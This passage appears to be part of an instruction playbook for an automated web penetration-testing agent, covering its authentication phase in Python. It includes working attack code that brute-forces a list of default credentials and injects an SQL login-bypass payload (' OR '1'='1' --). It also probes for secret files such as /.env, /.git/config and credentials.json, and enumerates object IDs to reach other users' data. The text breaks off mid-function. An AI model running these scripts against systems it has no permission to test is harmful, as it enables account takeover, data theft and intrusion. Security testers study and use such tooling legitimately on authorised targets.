**Phase 3 — Authentication**
  ═══════════════════════════════════════════════════════
  SPA / JSON API LOGIN (try this FIRST for SPAs — before HTML form login)
  ═══════════════════════════════════════════════════════
  Many modern apps (Angular, React, Vue) use JSON API login instead of HTML forms.
  You MUST try JSON API login paths FIRST, especially if _G['IS_SPA'] is True.

  ```python
  import requests, json, time

  BASE    = _G['BASE']
  creds_a = _G.get('creds_a', {})
  is_spa  = _G.get('IS_SPA', False)

  # JSON API login endpoints to try
  JSON_LOGIN_PATHS = [
      '/rest/user/login', '/api/login', '/api/auth/login', '/api/v1/login',
      '/api/v1/auth/login', '/auth/login', '/login', '/api/users/login',
      '/api/authenticate', '/api/signin', '/api/session', '/api/token',
      '/rest/auth', '/rest/login', '/rest/authenticate',
      '/user/login', '/users/login', '/account/login',
  ]

  # Field name combinations to try
  JSON_FIELD_COMBOS = [
      {'email': creds_a.get('username',''), 'password': creds_a.get('password','')},
      {'username': creds_a.get('username',''), 'password': creds_a.get('password','')},
      {'user': creds_a.get('username',''), 'pass': creds_a.get('password','')},
      {'login': creds_a.get('username',''), 'password': creds_a.get('password','')},
  ]

  api_login_session = requests.Session()
  api_login_session.verify = False
  api_login_session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) Chrome/120'
  api_login_session.headers['Content-Type'] = 'application/json'

  api_login_ok = False
  api_login_url = None

  for path in JSON_LOGIN_PATHS:
      url = BASE + path
      for combo in JSON_FIELD_COMBOS:
          time.sleep(0.2)
          try:
              r = api_login_session.post(url, json=combo, timeout=10)
              if r.status_code in (200, 201):
                  try:
                      data = r.json()
                      # Look for token/session in response
                      token = None
                      if isinstance(data, dict):
                          # Common token locations
                          for key_path in [
                              ('authentication', 'token'), ('token',), ('access_token',),
                              ('data', 'token'), ('data', 'access_token'),
                              ('result', 'token'), ('jwt',), ('session',),
                              ('auth_token',), ('id_token',),
                          ]:
                              obj = data
                              for k in key_path:
                                  if isinstance(obj, dict) and k in obj:
                                      obj = obj[k]
                                  else:
                                      obj = None
                                      break
                              if obj and isinstance(obj, str) and len(obj) > 10:
                                  token = obj
                                  break

                      if token:
                          print(f"[OK] JSON API login SUCCESS: {url}")
                          print(f"  Token: {token[:50]}...")
                          api_login_session.headers['Authorization'] = f'Bearer {token}'
                          api_login_ok = True
                          api_login_url = url
                          _G['auth_token'] = token
                          _G['api_login_url'] = url
                          # Store which field combo worked
                          _G['api_login_fields'] = combo
                          break
                      elif 'error' not in str(data).lower()[:200]:
                          print(f"  [INFO] {url} returned 200 but no token found: {str(data)[:200]}")
                  except Exception:
                      pass
          except Exception:
              continue
      if api_login_ok:
          break

  if api_login_ok:
      _G['session']   = api_login_session
      _G['session_a'] = api_login_session
      print(f"\n[OK] SPA/API authentication successful via {api_login_url}")
      print(f"  Authorization header set with Bearer token")
  else:
      if is_spa:
          print(f"[WARN] JSON API login failed — trying HTML form login as fallback")
      else:
          print(f"[INFO] Not a SPA or JSON login not found — using HTML form login")
  ```

  HTML FORM LOGIN (fallback — or primary for server-rendered apps):
  - Find login form: extract action URL (absolute), field names
  - Test provided credentials first
  - Test common defaults — EXHAUSTIVE list (test ALL of these):
      admin/admin, admin/admin123, admin/password, admin/password123, admin/123456,
      admin/admin1, admin/letmein, admin/welcome, admin/changeme,
      root/root, root/toor, root/password, root/admin,
      test/test, test/test123, test/password, guest/guest, guest/password,
      user/user, user/password, user/user123,
      alice/password1, alice/alice, alice/123456,
      bob/123456, bob/bob, bob/password,
      charlie/letmein, charlie/charlie,
      demo/demo, operator/operator, support/support
    Store ALL successful logins in _G['discovered_creds'] = [] for IDOR phase:
    ```python
    _G.setdefault('discovered_creds', [])
    # After each successful default login:
    _G['discovered_creds'].append({'username': user, 'password': password})
    ```
  - Test SQL injection in login fields — BUT you MUST confirm before reporting:

  SQLI LOGIN CONFIRMATION (mandatory — do all 3 steps):
  Step 1 — Baseline: submit a clearly WRONG login, capture exact response text
    r_normal = session.post(login_url, data={'user': 'wronguser999', 'pass': 'wrongpass999', ...})
    normal_text = r_normal.text
    print("Baseline response snippet:", normal_text[:400])

  Step 2 — Inject: submit the SQLi payload
    r_inject = session.post(login_url, data={'user': "' OR '1'='1' --", 'pass': 'x', ...})
    inject_text = r_inject.text
    print("Inject response snippet:", inject_text[:400])

  Step 3 — Compare content (NOT size — content!):
    # SQLi confirmed ONLY if the inject response is DIFFERENT from normal in a meaningful way:
    #   - Different page (e.g. dashboard/welcome vs login form)
    #   - New session cookie set after inject but not after normal login
    #   - SQL error message in response (mysql_error, ORA-, SQLSTATE, syntax error)
    # If both responses contain the same "wrong password" / login form text → FALSE POSITIVE
    if "wrong" in inject_text.lower() or "invalid" in inject_text.lower() or \
       "check user" in inject_text.lower() or inject_text.strip() == normal_text.strip():
        print("[INFO] Login SQLi NOT confirmed — server rejected payload normally")
    elif inject_text != normal_text:
        # Check specifically what changed
        if any(e in inject_text.lower() for e in ['mysql', 'sql syntax', 'sqlstate', 'ora-', 'pg_query']):
            print("[HIGH] SQL ERROR in response — error-based SQLi confirmed!")
            print("Evidence:", inject_text[:500])
        elif r_inject.cookies != r_normal.cookies or 'logout' in inject_text.lower():
            print("[CRITICAL] Login bypass confirmed — different session/page after inject!")
            print("Evidence:", inject_text[:500])
        else:
            print("[INFO] Response differs but bypass NOT confirmed — content not conclusive")
            print("Normal snippet:", normal_text[:200])
            print("Inject snippet:", inject_text[:200])

  - Check: error message differences (user enumeration)
  - Check: account lockout after N attempts
  - Check: HTTPS on login form?

  DEFAULT CREDENTIAL BRUTE-FORCE (mandatory — test ALL before proceeding):
  ```python
  import requests, time

  BASE = _G['BASE']
  login_url = _G.get('login_url', BASE + '/login')
  user_field = _G.get('user_field', 'username')
  pass_field = _G.get('pass_field', 'password')

  DEFAULT_CREDS = [
      ('admin', 'admin'), ('admin', 'admin123'), ('admin', 'password'),
      ('admin', 'password123'), ('admin', '123456'), ('admin', 'letmein'),
      ('admin', 'welcome'), ('admin', 'changeme'), ('admin', 'admin1'),
      ('root', 'root'), ('root', 'toor'), ('root', 'password'),
      ('test', 'test'), ('test', 'test123'), ('guest', 'guest'),
      ('user', 'user'), ('user', 'password'),
      ('alice', 'password1'), ('alice', 'alice'), ('alice', '123456'),
      ('bob', '123456'), ('bob', 'bob'), ('bob', 'password'),
      ('charlie', 'letmein'), ('charlie', 'charlie'),
      ('demo', 'demo'), ('operator', 'operator'), ('support', 'support'),
  ]

  _G.setdefault('discovered_creds', [])
  creds_a_user = _G.get('creds_a', {}).get('username', '')

  # Get baseline failed login response
  s = requests.Session()
  s.verify = False
  r_fail = s.post(login_url, data={user_field: 'nonexistent_user_xyz', pass_field: 'wrong_pass_xyz'}, allow_redirects=True)
  fail_text = r_fail.text.lower()

  for user, pwd in DEFAULT_CREDS:
      if user == creds_a_user:
          continue  # skip primary account
      time.sleep(0.3)
      try:
          ts = requests.Session()
          ts.verify = False
          r = ts.post(login_url, data={user_field: user, pass_field: pwd}, allow_redirects=True)
          body = r.text.lower()
          # Success indicators
          if ('logout' in body or 'dashboard' in body or 'welcome' in body or
              user.lower() in body or 'profile' in body) and 'invalid' not in body[:300]:
              print(f"  [HIGH] Default creds work: {user}/{pwd}")
              _G['discovered_creds'].append({'username': user, 'password': pwd})
          elif r.url != r_fail.url and 'login' not in r.url.lower():
              print(f"  [HIGH] Default creds work (redirect): {user}/{pwd} → {r.url}")
              _G['discovered_creds'].append({'username': user, 'password': pwd})
      except Exception:
          continue

  print(f"\n[AUTH] Discovered {len(_G['discovered_creds'])} working default credential pairs")
  for dc in _G['discovered_creds']:
      print(f"  {dc['username']} / {dc['password']}")
  ```

  SESSION FIXATION TEST (mandatory):
  ```python
  import requests

  BASE = _G['BASE']
  login_url = _G.get('login_url', BASE + '/login')
  user_field = _G.get('user_field', 'username')
  pass_field = _G.get('pass_field', 'password')
  creds_a = _G.get('creds_a', {})

  s = requests.Session()
  s.verify = False
  # Visit login page to get pre-auth session cookie
  r1 = s.get(login_url, allow_redirects=True)
  pre_cookies = dict(s.cookies)
  print(f"[SESSION] Pre-login cookies: {pre_cookies}")

  # Log in
  r2 = s.post(login_url, data={
      user_field: creds_a.get('username', ''),
      pass_field: creds_a.get('password', ''),
  }, allow_redirects=True)
  post_cookies = dict(s.cookies)
  print(f"[SESSION] Post-login cookies: {post_cookies}")

  # Check if session ID changed after login
  session_keys = [k for k in pre_cookies if 'session' in k.lower() or 'sid' in k.lower() or k == 'session']
  if not session_keys:
      session_keys = list(pre_cookies.keys())  # compare all cookies

  fixation_vuln = False
  for key in session_keys:
      if key in pre_cookies and key in post_cookies:
          if pre_cookies[key] == post_cookies[key]:
              print(f"  [HIGH] Session fixation: cookie '{key}' NOT rotated after login!")
              print(f"    Pre-login:  {pre_cookies[key][:40]}")
              print(f"    Post-login: {post_cookies[key][:40]}")
              fixation_vuln = True
              _G['session_fixation'] = True
  if not fixation_vuln:
      print("  [OK] Session cookies rotated after login")
  ```

  PASSWORD RESET TOKEN PREDICTABILITY TEST (if reset endpoint exists):
  ```python
  import requests, time, re

  BASE = _G['BASE']
  session = _G.get('session') or requests.Session()
  session.verify = False

  RESET_PATHS = ['/forgot', '/forgot-password', '/reset', '/reset-password',
                 '/password/reset', '/api/password/reset', '/account/forgot']

  for path in RESET_PATHS:
      url = BASE + path
      try:
          r = session.get(url, timeout=6, allow_redirects=True)
          if r.status_code == 200 and ('email' in r.text.lower() or 'reset' in r.text.lower()):
              print(f"  [INFO] Password reset page found: {url}")
              # Request two tokens and compare for predictability
              tokens = []
              for i in range(2):
                  r2 = session.post(url, data={'email': f'test{i}@test.local'}, timeout=10, allow_redirects=True)
                  # Look for token in response or URL
                  token_match = re.search(r'token[=:]\s*([a-zA-Z0-9_-]{8,})', r2.text)
                  if token_match:
                      tokens.append(token_match.group(1))
                  time.sleep(0.5)
              if len(tokens) == 2:
                  # Check if tokens are sequential or similar
                  if tokens[0][:6] == tokens[1][:6]:
                      print(f"  [HIGH] Predictable reset tokens: {tokens[0][:20]}... vs {tokens[1][:20]}...")
                  if all(t.isdigit() for t in tokens):
                      print(f"  [CRITICAL] Numeric-only reset tokens: {tokens}")
              break
      except Exception:
          continue
  ```

  DUAL-SESSION SETUP (mandatory — do this right after the primary login succeeds):
  Log in BOTH accounts and store them in _G. Phase 17 IDOR requires both sessions.

    ```python
    import requests

    BASE    = _G['BASE']
    creds_a = _G.get('creds_a', {})   # primary account
    creds_b = _G.get('creds_b')       # secondary account (may be None)

    # ── Check if JSON API login already succeeded ────────────────────────────
    if _G.get('session_a') and _G.get('auth_token'):
        print("[LOGIN] JSON API login already succeeded — skipping HTML form login")
        session_a = _G['session_a']
        _login_success = True
    else:
        _login_success = False

    # ── Session A: primary user ───────────────────────────────────────────────
    if not _login_success:
        session_a = requests.Session()
        session_a.verify = False
        session_a.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) Chrome/120'

    # Find login form — look for forms with password fields (universal, not just "login" in URL)
    all_forms = _G.get('ALL_FORMS', [])
    login_forms = []
    for f in all_forms:
        has_pass = any('pass' in fld['name'].lower() or fld.get('type') == 'password' for fld in f['fields'])
        if has_pass:
            login_forms.append(f)
    # Prefer forms with "login/signin/auth" in URL, but accept any form with a password field
    preferred = [f for f in login_forms if any(kw in f['action'].lower() + f['page'].lower()
                 for kw in ['login', 'signin', 'sign-in', 'auth', 'session'])]
    login_form = (preferred or login_forms or [None])[0]

    if login_form:
        login_url    = login_form['action']
        login_fields = login_form['fields']
        print(f"[LOGIN] Found form: {login_url}  fields={[f['name'] for f in login_fields]}")
    else:
        # Fallback: try common login paths
        login_url    = BASE + '/login'
        login_fields = []
        for path in ['/login', '/signin', '/auth/login', '/user/login', '/account/login', '/api/login', '/session']:
            try:
                _r = session_a.get(BASE + path, timeout=8, allow_redirects=True)
                if _r.status_code == 200 and 'password' in _r.text.lower():
                    login_url = BASE + path
                    print(f"[LOGIN] Found login page at {login_url}")
                    break
            except Exception:
                continue
        print(f"[LOGIN] No form with password field found in crawl — trying {login_url}")

    # Build field names from form (fallback to common names)
    user_field = next((f['name'] for f in login_fields if any(kw in f['name'].lower() for kw in ['user', 'email', 'login', 'name', 'account', 'id'])), 'username')
    pass_field = next((f['name'] for f in login_fields if 'pass' in f['name'].lower() or f.get('type') == 'password'), 'password')

    if not _login_success:
        # Store login details in _G for IDOR phase to use
        _G['login_url'] = login_url
        _G['user_field'] = user_field
        _G['pass_field'] = pass_field

        r_a = session_a.post(login_url, data={
            user_field: creds_a.get('username',''),
            pass_field: creds_a.get('password',''),
        }, allow_redirects=True)

    # Success check — universal indicators for ANY web app:
    # 1. URL changed away from login page
    # 2. Got new session cookies
    # 3. Body contains logged-in indicators (logout link, username, welcome, etc.)
    # 4. Got a redirect chain (login → home/dashboard/whatever)
    _body_a = r_a.text.lower()
    _uname_lower = creds_a.get('username','').lower()
    _login_indicators = ['logout', 'log out', 'sign out', 'signout', 'log-out',
                         'dashboard', 'welcome', 'my account', 'profile', 'settings',
                         'hello', 'hi ', f'logged in', _uname_lower]
    _login_page_kws = ['login', 'signin', 'sign-in', 'auth/login']
    _on_login_page = any(kw in r_a.url.lower() for kw in _login_page_kws)
    _has_indicators = any(ind in _body_a for ind in _login_indicators if ind)
    _got_cookies = bool(session_a.cookies)
    _was_redirected = bool(r_a.history)

    _login_success = (
        (not _on_login_page)                       # redirected away from login
        or _has_indicators                          # body shows logged-in content
        or (_got_cookies and _was_redirected)       # got session + redirect
        or (_got_cookies and _has_indicators)       # got session + logged-in body
    )

    if not _login_success and '_login_success' not in dir():
        _login_success = False
    if _login_success and _G.get('auth_token'):
        # Already logged in via JSON API — skip form login checks
        print(f"[OK] Session A already authenticated via API token")
    elif _login_success:
        print(f"[OK] Session A logged in as {creds_a.get('username')}  (URL: {r_a.url})")
        _G['session']   = session_a
        _G['session_a'] = session_a
        _G['post_login_url'] = r_a.url   # store where login redirected — seed for auth crawl
        # Try to extract user_id from page content (profile link, ID in URL, etc.)
        import re
        uid_match = re.search(r'/(?:profile|user|account|member)[/=](\d+)', r_a.text)
        if uid_match:
            _G['uid_a'] = int(uid_match.group(1))
            print(f"[OK] Session A user_id = {_G['uid_a']}")
    else:
        print(f"[FAIL] Session A login FAILED for {creds_a.get('username')} — check credentials")

    # ── Session B: secondary user (for IDOR cross-account testing) ────────────
    if creds_b:
        session_b = requests.Session()
        session_b.verify = False
        session_b.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) Chrome/120'

        r_b = session_b.post(login_url, data={
            user_field: creds_b.get('username',''),
            pass_field: creds_b.get('password',''),
        }, allow_redirects=True)
        _body_b = r_b.text.lower()
        _on_login_b = any(kw in r_b.url.lower() for kw in _login_page_kws)
        _has_ind_b = any(ind in _body_b for ind in _login_indicators if ind)
        _login_success_b = (
            (not _on_login_b)
            or _has_ind_b
            or (bool(session_b.cookies) and bool(r_b.history))
            or (bool(session_b.cookies) and _has_ind_b)
        )
        if _login_success_b:
            print(f"[OK] Session B logged in as {creds_b.get('username')}  (URL: {r_b.url})")
            _G['session_b'] = session_b
            uid_match = re.search(r'/(?:profile|user|account|member)[/=](\d+)', r_b.text)
            if uid_match:
                _G['uid_b'] = int(uid_match.group(1))
                print(f"[OK] Session B user_id = {_G['uid_b']}")
        else:
            print(f"[FAIL] Session B login FAILED for {creds_b.get('username')} — check credentials")
            _G['session_b'] = None
    else:
        print("[WARN] No secondary credentials — Phase 17 IDOR will test vertical access only")
        _G['session_b'] = None

    print(f"\nSession summary:")
    print(f"  session_a : {creds_a.get('username')} (uid={_G.get('uid_a','?')})")
    print(f"  session_b : {creds_b.get('username') if creds_b else 'NOT SET'} (uid={_G.get('uid_b','?')})")
    ```

  ═══════════════════════════════════════════════════════
  AUTHENTICATED CRAWL (mandatory — run this immediately after successful login)
  ═══════════════════════════════════════════════════════
  The unauthenticated spider in Phase 1 only saw the login page.
  After login you MUST re-crawl the ENTIRE application to discover:
    - Dashboard pages, user profile pages, settings pages
    - Comment/message forms, search forms, file upload forms
    - Admin panels, API endpoints
    - Any page that an authenticated user can access

  Run this IMMEDIATELY after a successful login, using the SAME session object:

    ```python
    import time, re
    from bs4 import BeautifulSoup
    from urllib.parse import urljoin, urlparse, parse_qs

    BASE    = _G['BASE']
    session = _G['session']   # already logged-in session

    AUTH_PAGES = {}
    AUTH_FORMS = []
    AUTH_PARAMS = []   # URL parameters found in links (for SQLi/XSS testing)

    auth_visited = set()
    # Seed from: 1) post-login redirect URL, 2) root, 3) ALL unauth-discovered pages/links
    _post_login = _G.get('post_login_url', BASE + '/')
    auth_queue   = [_post_login, BASE + '/']
    # Add all pages and links from the unauthenticated crawl — re-crawl them WITH auth
    for _u in list(_G.get('ALL_PAGES', {}).keys()) + list(_G.get('ALL_LINKS', set())):
        if _u.startswith(BASE) and _u not in auth_queue:
            auth_queue.append(_u)

    # ── CRITICAL: URLs to NEVER visit (would destroy the session or cause damage) ──
    SKIP_PATTERNS = [
        'logout', 'logoff', 'signout', 'sign-out', 'log-out',
        'delete', 'remove', 'destroy', 'drop', 'truncate',
        'unsubscribe', 'deactivate', 'terminate',
        'javascript:', 'mailto:', 'tel:', '#',
    ]

    def should_skip(url):
        url_lower = url.lower()
        return any(p in url_lower for p in SKIP_PATTERNS)

    def extract_page(url, r):
        soup = BeautifulSoup(r.text, 'html.parser')

        # 1. Discover all links — but SKIP dangerous ones
        for tag in soup.find_all('a', href=True):
            href = tag['href'].strip()
            if not href or should_skip(href):
                continue
            full = urljoin(url, href).split('#')[0].rstrip('/')
            if full.startswith(BASE) and full not in auth_visited:
                auth_queue.append(full)
                # Track URL parameters for later testing
                parsed = urlparse(full)
                if parsed.query:
                    for param, vals in parse_qs(parsed.query).items():
                        AUTH_PARAMS.append({
                            'url': full, 'param': param,
                            'value': vals[0], 'method': 'GET'
                        })

        # 2. Extract all forms — fields, method, action
        for form in soup.find_all('form'):
            action     = urljoin(url, form.get('action', url))
            method     = form.get('method', 'get').lower()
            fields, hidden = [], []
            csrf_token = None
            for inp in form.find_all(['input','textarea','select']):
                fname = inp.get('name') or inp.get('id') or ''
                ftype = inp.get('type', 'text').lower()
                fval  = inp.get('value', '')
                if not fname:
                    continue
                if ftype == 'hidden':
                    hidden.append({'name': fname, 'value': fval})
                    # Detect CSRF token fields
                    if any(x in fname.lower() for x in ['csrf','token','_token','authenticity']):
                        csrf_token = {'name': fname, 'value': fval}
                elif ftype not in ('submit','button','image','reset'):
                    fields.append({'name': fname, 'type': ftype, 'value': fval})
            if fields or hidden:
                form_entry = {
                    'page':       url,
                    'action':     action,
                    'method':     method,
                    'fields':     fields,
                    'hidden':     hidden,
                    'csrf_token': csrf_token,   # None if no CSRF protection
                }
                # Avoid duplicate forms
                if not any(f['action'] == action and f['method'] == method for f in AUTH_FORMS):
                    AUTH_FORMS.append(form_entry)
                    print(f"  [FORM] {method.upper()} {action}")
                    for f in fields:
                        print(f"    {f['name']} ({f['type']})")
                    if csrf_token:
                        print(f"    [CSRF TOKEN FOUND] {csrf_token['name']}={csrf_token['value'][:20]}...")
                    else:
                        print(f"    [NO CSRF TOKEN] — forms may be vulnerable to CSRF")

        # 3. Discover links in JavaScript (API endpoints, fetch() calls)
        for script in soup.find_all('script'):
            src = script.get('src', '')
            if src and src.endswith('.js') and urlparse(urljoin(url, src)).netloc == urlparse(BASE).netloc:
                try:
                    js_url = urljoin(url, src)
                    rjs = session.get(js_url, timeout=8)
                    # Find fetch/axios/XMLHttpRequest URLs
                    for m in re.finditer(r'''['"](/[a-zA-Z0-9/_-]{3,}(?:\\?[^'"]*)?)['"]\\s*''', rjs.text):
                        candidate = BASE + m.group(1)
                        if candidate not in auth_visited and not should_skip(candidate):
                            auth_queue.append(candidate)
                except Exception:
                    pass
            # Also scan inline script tags
            if script.string:
                for m in re.finditer(r'''(?:fetch|get|post|axios)\\s*\\(\\s*['"](/[a-zA-Z0-9/_-]{3,})['"]\\s*''',
                                     script.string, re.I):
                    candidate = BASE + m.group(1)
                    if candidate not in auth_visited and not should_skip(candidate):
                        auth_queue.append(candidate)

    # ── Main BFS crawl ────────────────────────────────────────────────────────
    while auth_queue:
        url = auth_queue.pop(0).split('#')[0].rstrip('/')
        if url in auth_visited or not url.startswith(BASE):
            continue
        if should_skip(url):
            print(f"  [SKIP] {url} — dangerous URL pattern")
            continue
        auth_visited.add(url)
        try:
            r = session.get(url, timeout=10, allow_redirects=True)
        except Exception as e:
            print(f"  [ERR] {url} — {e}")
            continue
        # Detect redirect to login/auth pages (session lost or access denied)
        _rurl = r.url.lower()
        _uurl = url.lower()
        _auth_kws = ['login', 'signin', 'sign-in', 'auth', 'sso', 'cas/login', 'oauth']
        if any(kw in _rurl for kw in _auth_kws) and not any(kw in _uurl for kw in _auth_kws):
            print(f"  [REDIRECT→LOGIN] {url} → {r.url}")
            continue
        AUTH_PAGES[url] = r.text
        print(f"  [CRAWL] {url}  ({r.status_code}  {len(r.text)} bytes)")
        extract_page(url, r)
        time.sleep(0.15)

    # ── Phase 2: Common path probing (paths NOT found by crawl) ──────────────
    # Many endpoints are never linked from HTML — probe them directly.
    print("\n[PROBE] Checking common paths not found by crawl...")
    COMMON_PATHS = [
        # Debug / info disclosure
        '/debug', '/info', '/status', '/health', '/healthz', '/env',
        '/config', '/settings', '/server-info', '/server-status',
        '/phpinfo.php', '/phpinfo', '/_profiler', '/telescope', '/horizon',

        # Admin panels
        '/admin', '/admin/config', '/admin/users', '/admin/logs',
        '/admin/settings', '/admin/dashboard', '/manage', '/management',
        '/panel', '/cp', '/control', '/backstage', '/staff',

        # API endpoints
        '/api', '/api/v1', '/api/v2', '/api/users', '/api/user/1',
        '/api/admin', '/api/config', '/api/me', '/api/profile',
        '/api/orders', '/api/products', '/api/items', '/api/keys',
        '/swagger.json', '/openapi.json', '/api-docs', '/v1/docs',
        '/graphql', '/api/graphql', '/v1/graphql', '/v2/graphql',
        '/query', '/gql', '/graphiql', '/playground',

        # Sensitive files
        '/robots.txt', '/sitemap.xml', '/.env', '/.env.local',
        '/.git/HEAD', '/.git/config', '/backup.sql', '/dump.sql',
        '/database.sql', '/config.php', '/wp-config.php',
        '/credentials.json', '/secrets.json', '/keys.json',

        # Auth / account management
        '/register', '/signup', '/forgot', '/reset', '/reset-password',
        '/change-password', '/2fa', '/mfa', '/verify',

        # Common app paths
        '/upload', '/uploads', '/files', '/download', '/export',
        '/import', '/backup', '/restore', '/logs', '/log',
        '/search', '/find', '/query', '/fetch', '/proxy', '/redirect',
        '/deserialize', '/import-data', '/load',
    ]

    for path in COMMON_PATHS:
        url = BASE + path
        if url in AUTH_PAGES or url in auth_visited:
            continue
        try:
            r = session.get(url, timeout=6, allow_redirects=True)
        except Exception:
            continue
        if r.status_code == 404:
            continue
        _prurl = r.url.lower()
        if any(kw in _prurl for kw in _auth_kws) and not any(kw in path.lower() for kw in _auth_kws):
            print(f"  [AUTH REQUIRED] {path} → {r.url}")
            continue
        AUTH_PAGES[url] = r.text
        auth_visited.add(url)
        print(f"  [PROBE FOUND] {path}  ({r.status_code}  {len(r.text)} bytes)")
        extract_page(url, r)
        time.sleep(0.1)

    # ── Phase 3: ID enumeration for discovered patterns ───────────────────────
    # For every /{path}/{integer-id} found, enumerate nearby IDs.
    # This finds other users' objects even if not linked.
    print("\n[ENUMERATE] Testing ID ranges for discovered patterns...")
    UUID_RE = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I)
    id_patterns = {}   # {'/profile/': [1, 2, ...]}
    for url in list(AUTH_PAGES.keys()):
        parts = urlparse(url).path.strip('/').split('/')
        for i, part in enumerate(parts):
            if re.fullmatch(r'\\d{1,6}', part) and int(part) > 0:
                prefix = '/' + '/'.join(parts[:i]) + '/'
                id_patterns.setdefault(prefix, set()).add(int(part))

    for prefix, found_ids in id_patterns.items():
        max_id = max(found_ids)
        # Test IDs 1 through max_id+5 (to find objects belonging to other users)
        test_ids = list(range(1, min(max_id + 6, 20)))
        print(f"  {prefix}{{id}} — testing IDs {test_ids}")
        for test_id in test_ids:
            url = BASE + prefix + str(test_id)
            if url in auth_visited:
                continue
            try:
                r = session.get(url, timeout=6, allow_redirects=True)
            except Exception:
                continue
            if r.status_code == 404:
                continue
            if 'login' in r.url:
                continue
            AUTH_PAGES[url] = r.text
            auth_visited.add(url)
            print(f"    [ID {test_id}] {url}  ({r.status_code}  {len(r.text)} bytes)")
            extract_page(url, r)
            time.sleep(0.1)

    _G['AUTH_PAGES']  = AUTH_PAGES
    _G['AUTH_FORMS']  = AUTH_FORMS
    _G['AUTH_PARAMS'] = AUTH_PARAMS

    print(f"\n=== CRAWL COMPLETE ===")
    print(f"Pages   : {len(AUTH_PAGES)}")
    print(f"Forms   : {len(AUTH_FORMS)}")
    print(f"Params  : {len(AUTH_PARAMS)}")
    print(f"\nAll pages discovered:")
    for u in sorted(AUTH_PAGES):
        print(f"  {u}  ({len(AUTH_PAGES[u])} bytes)")
    print(f"\nAll forms:")
    for f in AUTH_FORMS:
        csrf = '✗ NO CSRF' if not f['csrf_token'] else '✓ CSRF'
        print(f"  [{f['method'].upper()}] {f['action']}  {csrf}  fields={[x['name'] for x in f['fields']]}")
    ```

  USE these AUTH_FORMS in ALL subsequent phases (XSS, SQLi, CSRF, IDOR, CMDi, SSTI).
  Do NOT only test the login form — test EVERY form you discovered in this crawl.

  ═══════════════════════════════════════════════════════
  RULE: TEST ALL PAGES, ALL FORMS, ALL PARAMETERS — NO EXCEPTIONS
  ═══════════════════════════════════════════════════════
  After the authenticated crawl, you have AUTH_PAGES, AUTH_FORMS, and AUTH_PARAMS.
  In EVERY subsequent testing phase, you MUST:
    1. Iterate through ALL forms in AUTH_FORMS + ALL_FORMS
    2. Test EVERY text input field in each form (not just fields with "obvious" names)
    3. Also test URL parameters found in AUTH_PARAMS
    4. Visit EVERY page in AUTH_PAGES and look for features to test
    5. NEVER skip a form because "it doesn't look injectable" — test it anyway

  The crawl discovered these pages/forms for a reason. A form on /tools with a "target"
  field is a command injection candidate. A form on /notes with a "content" field is a
  stored XSS candidate. A form on /profile with an "avatar" URL field is an SSRF candidate.
  A search form with a "q" field is an SSTI candidate. TEST THEM ALL.

  If a phase says "test all forms" but you only tested 2 out of 15, YOU DID IT WRONG.
  Go back and test the remaining forms before moving to the next phase.

  ═══════════════════════════════════════════════════════
  OBJECT ID HARVESTING (run immediately after authenticated crawl)
  ═══════════════════════════════════════════════════════
  After crawling all pages as Session A, extract EVERY object reference found —
  integers, UUIDs, hashes, slugs — from URLs, HTML, JSON, query params, data attributes.
  These are the IDs you will replay with Session B in Phase 17.

    ```python
    import re, json
    from urllib.parse import urlparse, parse_qs, urljoin

    BASE       = _G['BASE']
    AUTH_PAGES = _G['AUTH_PAGES']
    ALL_PAGES  = _G.get('ALL_PAGES', {})

    # Regex patterns for different ID formats
    UUID_RE  = re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I)
    HASH_RE  = re.compile(r'\b([0-9a-f]{32}|[0-9a-f]{40})\b', re.I)  # MD5 / SHA1
    INT_RE   = re.compile(r'\b(\\d{1,9})\b')

    # OBJECT_MAP: maps endpoint_pattern -> list of discovered endpoints with their IDs
    # e.g. '/invoice/{id}' -> [{'url':'/invoice/1','id':'1','type':'int','response_snippet':'...'}]
    OBJECT_MAP   = {}   # {pattern: [entry, ...]}
    ID_INVENTORY = []   # flat list of all found IDs with context

    def extract_ids(page_url, body, response_headers):
        found = []
        parsed = urlparse(page_url)

        # 1 — IDs in the URL path itself
        parts = parsed.path.strip('/').split('/')
        for i, part in enumerate(parts):
            if UUID_RE.fullmatch(part):
                found.append({'type':'uuid','value':part,'location':'url_path','url':page_url,
                              'pattern': '/' + '/'.join(parts[:i] + ['{uuid}'] + parts[i+1:])})
            elif re.fullmatch(r'\\d{1,9}', part) and int(part) > 0:
                found.append({'type':'int','value':part,'location':'url_path','url':page_url,
                              'pattern': '/' + '/'.join(parts[:i] + ['{id}'] + parts[i+1:])})
            elif HASH_RE.fullmatch(part):
                found.append({'type':'hash','value':part,'location':'url_path','url':page_url,
                              'pattern': '/' + '/'.join(parts[:i] + ['{hash}'] + parts[i+1:])})

        # 2 — IDs in query string
        for param, values in parse_qs(parsed.query).items():
            for val in values:
                if UUID_RE.fullmatch(val):
                    found.append({'type':'uuid','value':val,'location':f'query:{param}','url':page_url,
                                  'pattern': page_url.split('?')[0] + f'?{param}={{uuid}}'})
                elif re.fullmatch(r'\\d{1,9}', val) and int(val) > 0:
                    found.append({'type':'int','value':val,'location':f'query:{param}','url':page_url,
                                  'pattern': page_url.split('?')[0] + f'?{param}={{id}}'})

        # 3 — IDs in href/action/src attributes in HTML
        for m in re.finditer(r'(?:href|action|src)=["\']([^"\']{3,})["\']', body, re.I):
            href = urljoin(page_url, m.group(1)).split('#')[0]
            if not href.startswith(BASE):
                continue
            href_path = urlparse(href).path.strip('/').split('/')
            for i, part in enumerate(href_path):
                if UUID_RE.fullmatch(part):
                    found.append({'type':'uuid','value':part,'location':'html_href',
                                  'url': href,
                                  'pattern': '/' + '/'.join(href_path[:i]+['{uuid}']+href_path[i+1:])})
                elif re.fullmatch(r'\\d{1,9}', part) and int(part) > 0:
                    found.append({'type':'int','value':part,'location':'html_href',
                                  'url': href,
                                  'pattern': '/' + '/'.join(href_path[:i]+['{id}']+href_path[i+1:])})

        # 4 — data-id / data-user-id / data-resource-id HTML attributes
        for m in re.finditer(r'data-[\\w-]*id[\\w-]*=["\']([^"\']+)["\']', body, re.I):
            val = m.group(1)
            if UUID_RE.fullmatch(val):
